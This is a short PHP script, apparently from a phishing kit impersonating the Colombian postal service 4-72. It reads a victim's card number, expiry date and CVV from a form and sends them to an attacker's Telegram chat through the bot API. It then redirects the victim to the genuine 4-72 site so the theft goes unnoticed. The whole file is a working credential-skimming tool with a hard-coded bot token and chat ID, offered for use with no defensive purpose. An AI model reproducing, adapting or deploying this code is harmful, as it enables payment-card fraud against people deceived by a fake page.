<?php
// Datos del formulario
$numero_tarjeta = $_POST['codigo'];
$fecha_expiracion = $_POST['fecha'];
$cvv = $_POST['cvv'];

// Datos del bot de Telegram
$token = '7638665235:AAHjcWInBDFFJ9cRd8eFM2MeaQpcVrvzpoE'; // Reemplaza con tu token del bot
$chat_id = '-4678292542'; // Reemplaza con tu chat ID

// Mensaje a enviar a Telegram
$mensaje = "📄 Información de pago:\n";
$mensaje .= "Número de Tarjeta: $numero_tarjeta\n";
$mensaje .= "Fecha Expiración: $fecha_expiracion\n";
$mensaje .= "CVV: $cvv";

// URL de la API de Telegram
$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($mensaje);

// Enviar el mensaje a Telegram usando file_get_contents
$response = file_get_contents($url);

// Verificar si el mensaje se envió correctamente
if ($response) {
    // Si la solicitud fue exitosa, redirigir a la página de agradecimiento
    header("Location: https://www.4-72.com.co/");
    exit();
} else {
    // Si hubo un error al enviar el mensaje, redirigir a la página de error
    header("Location: https://www.4-72.com.co/");
    exit();
}
?>
